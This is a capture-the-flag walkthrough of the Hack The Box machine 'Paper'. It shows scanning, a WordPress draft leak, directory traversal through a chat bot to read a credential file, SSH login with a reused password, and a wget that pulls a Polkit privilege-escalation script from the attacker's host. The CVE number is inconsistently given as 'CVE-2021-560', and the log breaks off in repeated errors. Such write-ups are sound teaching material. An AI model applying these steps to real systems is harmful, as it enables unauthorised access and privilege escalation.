# [paper](https://app.hackthebox.com/machines/Paper)

> Blunder Tiffin Inc.'s Linux server, hosting their WordPress blog and [Rocket Chat](https://rocket.chat/enterprise/open-source) server. The Apache web server leaks the hostname that leads to the blog and Rocket Chat server. The WordPress version is vulnerable to [an unauthorized information disclosure vulnerability](https://www.exploit-db.com/exploits/47690), which can be exploited to leak Michael Scott's drafts, one of which contains a Rocket Chat registration link. With access to Blunder Tiffin Inc.'s Rocket Chat, it is possible to interact with a chat bot that Dwight built, Recyclops, to interact with his coworkers so he can be more productive. Recyclops opens up a directory traversal vulnerability and an arbitrary file read vulnerability, making it possible to read an environment variable file that contains the password to the Recyclops Rocket Chat account. Dwight's system account password is the same. With SSH access to the machine, it is possible to elevate privileges through [CVE-2021-560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/) due to the machine's Polkit version.

---

## Open Port Enumeration

The target's TCP ports 22 (SSH), 80 (HTTP), and 443 (HTTPS) are open.

```bash
$ sudo masscan -p1-65535 10.129.184.197 --rate=1000 -e tun0 --output-format grepable --output-filename enum/paper.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-02-23 17:34:08 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/paper.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,443,80,
```

Both port 80 and 443 are running Apache version 2.4.37. Based on their titles, both appear to be the default CentOS web server landing page.

```bash
$ nmap -sC -sV -p22,80,443 10.129.184.197 -oA enum/paper
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-23 12:39 EST
Nmap scan report for 10.129.184.197
Host is up (0.043s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds
```

---

## Port 443 Enumeration

### Content Discovery

Yet again, nothing significant here. All these paths are from the Apache manual module.

```bash
$ feroxbuster -u https://10.129.184.197 -k -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.129.184.197
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      238c https://10.129.184.197/manual => https://10.129.184.197/manual/
301      GET        7l       20w      243c https://10.129.184.197/manual/misc => https://10.129.184.197/manual/misc/
301      GET        7l       20w      245c https://10.129.184.197/manual/images => https://10.129.184.197/manual/images/
301      GET        7l       20w      244c https://10.129.184.197/manual/style => https://10.129.184.197/manual/style/
301      GET        7l       20w      248c https://10.129.184.197/manual/style/css => https://10.129.184.197/manual/style/css/
301      GET        7l       20w      252c https://10.129.184.197/manual/style/scripts => https://10.129.184.197/manual/style/scripts/
301      GET        7l       20w      242c https://10.129.184.197/manual/faq => https://10.129.184.197/manual/faq/
301      GET        7l       20w      249c https://10.129.184.197/manual/style/lang => https://10.129.184.197/manual/style/lang/
301      GET        7l       20w      242c https://10.129.184.197/manual/ssl => https://10.129.184.197/manual/ssl/
301      GET        7l       20w      242c https://10.129.184.197/manual/mod => https://10.129.184.197/manual/mod/
[####################] - 24s   659978/659978  0s      found:10      errors:326474
[####################] - 24s    59998/59998   3684/s  https://10.129.184.197
[####################] - 15s    59998/59998   4381/s  https://10.129.184.197/manual
[####################] - 15s    59998/59998   4215/s  https://10.129.184.197/manual/misc
[####################] - 15s    59998/59998   4142/s  https://10.129.184.197/manual/images
[####################] - 14s    59998/59998   4382/s  https://10.129.184.197/manual/style
[####################] - 13s    59998/59998   4503/s  https://10.129.184.197/manual/style/css
[####################] - 15s    59998/59998   4298/s  https://10.129.184.197/manual/style/scripts
[####################] - 14s    59998/59998   4621/s  https://10.129.184.197/manual/faq
[####################] - 14s    59998/59998   4612/s  https://10.129.184.197/manual/style/lang
[####################] - 13s    59998/59998   5065/s  https://10.129.184.197/manual/ssl
[####################] - 13s    59998/59998   4831/s  https://10.129.184.197/manual/mod
```

---

## `http://office.paper` - Blunder Tiffin Inc. Blog

A WordPress blog for Blunder Tiffin Inc., "the best paper company in the electric-city Scranton!"

### Content Discovery

Just the typical WordPress paths.

```bash
$ feroxbuster -u http://office.paper -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://office.paper
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      237c http://office.paper/wp-admin => http://office.paper/wp-admin/
301      GET        7l       20w      239c http://office.paper/wp-content => http://office.paper/wp-content/
301      GET        7l       20w      240c http://office.paper/wp-includes => http://office.paper/wp-includes/
301      GET        7l       20w      244c http://office.paper/wp-admin/images => http://office.paper/wp-admin/images/
301      GET        7l       20w      246c http://office.paper/wp-admin/includes => http://office.paper/wp-admin/includes/
301      GET        7l       20w      241c http://office.paper/wp-admin/css => http://office.paper/wp-admin/css/
301      GET        7l       20w      240c http://office.paper/wp-admin/js => http://office.paper/wp-admin/js/
301      GET        7l       20w      242c http://office.paper/wp-admin/user => http://office.paper/wp-admin/user/
301      GET        7l       20w      247c http://office.paper/wp-content/plugins => http://office.paper/wp-content/plugins/
301      GET        7l       20w      246c http://office.paper/wp-content/themes => http://office.paper/wp-content/themes/
301      GET        7l       20w      243c http://office.paper/wp-includes/js => http://office.paper/wp-includes/js/
301      GET        7l       20w      244c http://office.paper/wp-includes/css => http://office.paper/wp-includes/css/
301      GET        7l       20w      247c http://office.paper/wp-includes/images => http://office.paper/wp-includes/images/
200      GET        0l        0w        0c http://office.paper/wp-includes/comment.php
200      GET        0l        0w        0c http://office.paper/wp-includes/cache.php
200      GET        0l        0w        0c http://office.paper/wp-includes/category.php
200      GET        0l        0w        0c http://office.paper/wp-includes/user.php
200      GET        0l        0w        0c http://office.paper/wp-includes/feed.php
301      GET        7l       20w      253c http://office.paper/wp-includes/images/media => http://office.paper/wp-includes/images/media/
200      GET        0l        0w        0c http://office.paper/wp-admin/includes/comment.php
302      GET        1l        0w        0c http://office.paper/wp-admin/comment.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fcomment.php&reauth=1
302      GET        1l        0w        0c http://office.paper/wp-admin/admin.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fadmin.php&reauth=1
200      GET        0l        0w        0c http://office.paper/wp-admin/includes/misc.php
302      GET        1l        0w        0c http://office.paper/wp-admin/themes.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fthemes.php&reauth=1
302      GET        1l        0w        0c http://office.paper/wp-admin/plugins.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fplugins.php&reauth=1
500      GET        0l        0w        0c http://office.paper/wp-admin/includes/template.php
302      GET        1l        0w        0c http://office.paper/wp-admin/user/admin.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fuser%2Fadmin.php&reauth=1
302      GET        1l        0w        0c http://office.paper/wp-admin/users.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fusers.php&reauth=1
302      GET        1l        0w        0c http://office.paper/wp-admin/export.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fexport.php&reauth=1
301      GET        7l       20w      247c http://office.paper/wp-content/upgrade => http://office.paper/wp-content/upgrade/
200      GET       27l       91w        0c http://office.paper/wp-admin/upgrade.php
301      GET        7l       20w      247c http://office.paper/wp-includes/blocks => http://office.paper/wp-includes/blocks/
301      GET        1l        0w        0c http://office.paper/index.php => http://office.paper/
302      GET        1l        0w        0c http://office.paper/wp-admin/upload.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fupload.php&reauth=1
200      GET        0l        0w        0c http://office.paper/wp-content/index.php
200      GET        0l        0w        0c http://office.paper/wp-includes/blocks.php
301      GET        7l       20w      246c http://office.paper/wp-includes/fonts => http://office.paper/wp-includes/fonts/
302      GET        1l        0w        0c http://office.paper/wp-admin/import.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fimport.php&reauth=1
200      GET        0l        0w        0c http://office.paper/wp-admin/includes/media.php
301      GET        7l       20w      235c http://office.paper/manual => http://office.paper/manual/
200      GET        0l        0w        0c http://office.paper/wp-includes/date.php
500      GET        0l        0w        0c http://office.paper/wp-admin/menu.php
301      GET        7l       20w      250c http://office.paper/wp-includes/customize => http://office.paper/wp-includes/customize/
302      GET        1l        0w        0c http://office.paper/wp-admin/user/profile.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fuser%2Fprofile.php&reauth=1
301      GET        7l       20w      242c http://office.paper/manual/images => http://office.paper/manual/images/
200      GET        0l        0w        0c http://office.paper/wp-content/themes/index.php
302      GET        1l        0w        0c http://office.paper/wp-admin/link.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Flink.php&reauth=1
302      GET        1l        0w        0c http://office.paper/wp-admin/privacy.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fprivacy.php&reauth=1
302      GET        1l        0w        0c http://office.paper/wp-admin/update.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fupdate.php&reauth=1
301      GET        7l       20w      248c http://office.paper/wp-admin/js/widgets => http://office.paper/wp-admin/js/widgets/
302      GET        1l        0w        0c http://office.paper/wp-admin/user/credits.php => http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fuser%2Fcredits.php&reauth=1
[####################] - 1m   1319956/1319956 0s      found:51      errors:603719
[####################] - 53s    59998/59998   1119/s  http://office.paper
[####################] - 1m     59998/59998   1018/s  http://office.paper/wp-admin
[####################] - 55s    59998/59998   1098/s  http://office.paper/wp-content
[####################] - 55s    59998/59998   1089/s  http://office.paper/wp-includes
[####################] - 57s    59998/59998   1095/s  http://office.paper/wp-admin/images
[####################] - 56s    59998/59998   1106/s  http://office.paper/wp-admin/includes
[####################] - 1m     59998/59998   1024/s  http://office.paper/wp-admin/css
[####################] - 55s    59998/59998   1103/s  http://office.paper/wp-admin/js
[####################] - 1m     59998/59998   982/s   http://office.paper/wp-admin/user
[####################] - 55s    59998/59998   1097/s  http://office.paper/wp-content/plugins
[####################] - 1m     59998/59998   934/s   http://office.paper/wp-content/themes
[####################] - 58s    59998/59998   1083/s  http://office.paper/wp-includes/js
[####################] - 58s    59998/59998   1075/s  http://office.paper/wp-includes/css
[####################] - 1m     59998/59998   988/s   http://office.paper/wp-includes/images
[####################] - 1m     59998/59998   1001/s  http://office.paper/wp-includes/images/media
[####################] - 1m     59998/59998   990/s   http://office.paper/wp-content/upgrade
[####################] - 56s    59998/59998   1122/s  http://office.paper/wp-includes/blocks
[####################] - 57s    59998/59998   1045/s  http://office.paper/wp-includes/fonts
[####################] - 53s    59998/59998   1186/s  http://office.paper/manual
[####################] - 53s    59998/59998   1167/s  http://office.paper/wp-includes/customize
[####################] - 48s    59998/59998   1254/s  http://office.paper/manual/images
[####################] - 44s    59998/59998   1360/s  http://office.paper/wp-admin/js/widgets
```

### Virtual Host Discovery

`chat.office.paper` discovered. Add it to the local DNS resolver.

```bash
$ gobuster vhost -u http://office.paper -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://office.paper
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/23 16:01:57 Starting gobuster in VHOST enumeration mode
===============================================================
Found: chat.office.paper (Status: 200) [Size: 223163]

===============================================================
2022/02/23 16:03:34 Finished
===============================================================
```

### Manual Enumeration

The blog contains three posts, all authored by Michael Scott (`Prisonmike`). The most recent post has been commented on by `nick`, who urges Michael to remove the secret within his drafts.

### WordPress Enumeration

According to `wpscan`, the WordPress version is 5.2.3.

```bash
$ wpscan --url http://office.paper
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://office.paper/ [10.129.184.197]
[+] Started: Wed Feb 23 16:39:37 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Feb 23 16:39:43 2022
[+] Requests Done: 185
[+] Cached Requests: 5
[+] Data Sent: 44.421 KB
[+] Data Received: 17.965 MB
[+] Memory used: 235.039 MB
[+] Elapsed time: 00:00:06
```

[An information disclosure vulnerability in WordPress 5.2.3](https://www.exploit-db.com/exploits/47690) makes it possible to read Michael's drafts at `http://office.paper/index.php/author/prisonmike/?static=1`. These contain the URL for the "new employee chat system," `http://chat.office.paper/register/8qozr226AhkCHZdyY`.

![](images/Pasted%20image%2020220223181258.png)

---

## `http://chat.office.paper` - Blunder Tiffin Inc. Communications Platform

Blunder Tiffin's [Rocket Chat](https://rocket.chat/enterprise/open-source) server. [Rocket Chat](https://rocket.chat/enterprise/open-source) is an open-source communications platform, similar to [Slack](https://slack.com/) and [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software).

### Content Discovery

Traditional content discovery doesn't work well because [Rocket Chat](https://rocket.chat/enterprise/open-source) leverages websockets for much of its communication.

### Virtual Host Discovery

There are no virtual hosts under `chat.office.paper`.

```bash
$ gobuster vhost -u http://chat.office.paper  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://chat.office.paper
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/23 16:22:08 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2022/02/23 16:24:05 Finished
===============================================================
```

### Registration

Use the secret registration link from `Prisonmike`'s drafts to register an account on `chat.office.paper`. This grants access to Blunder Tiffin's [Rocket Chat](https://rocket.chat/enterprise/open-source) instance. Upon logging in, access is granted to the General channel.

![](images/Pasted%20image%2020220223181803.png)


### Recyclops Bot

According to the chatter in the General channel, Dwight created a chat bot named Recyclops to interact with his coworkers on his behalf so he can be more productive. Recyclops has several interesting features, a few with security concerns. Recyclops can be interacted with by sending it direct messages. Its help message:

```txt
$ help
Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.

Most frequently asked questions include:
- What time is it?
- What new files are in your sales directory?
- Why did the salesman crossed the road?
- What's the content of file x in your sales directory? etc.

Please note that I am a beta version and I still have some bugs to be fixed.

How to use me ? :

1. Small Talk:
You can ask me how dwight's weekend was, or did he watched the game last night etc.
eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?

2. Joke:
You can ask me Why the salesman crossed the road.
eg: 'recyclops why did the salesman crossed the road?'
<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.

3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'

4. List:
You can ask me to list the files

5. Time:
You can ask me to what the time is
eg: 'recyclops what time is it?' or just 'recyclops time'
```

---

## Recyclops Rocket Chat Bot - Reading Dwight's Password

Recyclops can be used to list and retrieve the contents of files in the `/home/dwight/sales/` directory.

The message `list $PATH` appears to execute `ls /home/dwight/sales/$PATH`.

```txt
$ list
 Fetching the directory listing of /sales/
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 11 dwight dwight 281 Feb 6 07:55 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2

$ list /etc
 Fetching the directory listing of /etc
ls: cannot access '/home/dwight/sales//etc': No such file or directory

$ list sale
 Fetching the directory listing of sale
total 4
drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 .
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
-rw-r--r-- 1 dwight dwight 158 Sep 15 13:03 portfolio.txt

$ list sale_2
 Fetching the directory listing of sale_2
total 4
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 .
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
-rw-r--r-- 1 dwight dwight 113 Jul 3 2021 portfolio.txt
```

The message `file $PATH` appears to execute `cat /home/dwight/sales/$PATH`.

```txt
$ file sale/portfolio.txt
 <!=====Contents of file sale/portfolio.txt=====>
Portfolio
----------
- Bill
- Served the country in war
- Family built the country
- purchased paper worth a million dollars
- will probably fire me.
<!=====End of file sale/portfolio.txt=====>

$ file sale_2/portfolio.txt
 <!=====Contents of file sale_2/portfolio.txt=====>
Portfolio
----------
- Christian
- Still No idea how micheal made the sale!
- Need further clarifications.
<!=====End of file sale_2/portfolio.txt=====>
```

On first glance, the bot seems fairly resilient to command injection. However, it is vulnerable to directory traversal.

```txt
$ list ../
Fetching the directory listing of ../
total 32
drwx------ 11 dwight dwight 281 Feb 6 07:55 .
drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh
-r-------- 1 dwight dwight 33 Feb 23 12:29 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim
```

Looking around `dwight`'s home directory, there's an interesting non-standard directory named `hubot/`. [Hubot](https://github.com/hubotio/hubot) "is a framework for building chat bots, modeled after GitHub's Campfire bot of the same name." Recyclops was built using this framework. This directory appears to hold Recyclops' source code and configuration files.

There's an environment variable file in `hubot/` named`.env`. It appears to contain a credential for the `recyclops` Rocket Chat user: `Queenofblad3s!23`.

```txt
$ file ../hubot/.env
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

It appears that `dwight` reused his own user account credential for the `recyclops` Rocket Chat account. Login as `dwight` with the password `Queenofblad3s!23` and grab the user flag at `/home/dwight/user.txt`.

```bash
$ ssh dwight@office.paper
The authenticity of host 'office.paper (10.129.184.197)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'office.paper' (ED25519) to the list of known hosts.
dwight@office.paper's password:
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
[dwight@paper ~]$ ls -la user.txt
-r-------- 1 dwight dwight 33 Feb 23 12:29 user.txt
```

---

## CVE-2021-3560 Privilege Escalation

The target's operating system is CentOS 8 and according to [this blog post](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/), may be vulnerable to [CVE-2021-560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/), a privilege escalation vulnerability in the system's version of [Polkit](https://en.wikipedia.org/wiki/Polkit).

Stage the exploit script from [here](https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py) to the target.

```bash
[dwight@paper ~]$ wget http://10.10.14.75/CVE-2021-3560.py
--2022-02-24 10:29:56--  http://10.10.14.75/CVE-2021-3560.py
Connecting to 10.10.14.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2434 (2.4K) [text/x-python]
Saving to: ‘CVE-2021-3560.py’

CVE-2021-3560.py                       100%[============================================================================>]   2.38K  --.-KB/s    in 0s

2022-02-24 10:29:56 (13.2 MB/s) - ‘CVE-2021-3560.py’ saved [2434/2434]
```

Run the script to gain a shell as `root`. Read the system flag at `/root/root.txt`.

```bash
[dwight@paper ~]$ python3 CVE-2021-3560.py
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit
id: ‘ahmed’: no such user
id: ‘ahmed’: no such user
id: ‘ahmed’: no such user
id: ‘ahmed’: no such user
id: ‘ahmed’: no such user
[+] User Created with the name of ahmed
[+] Timed out at: 0.007884397543704895
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
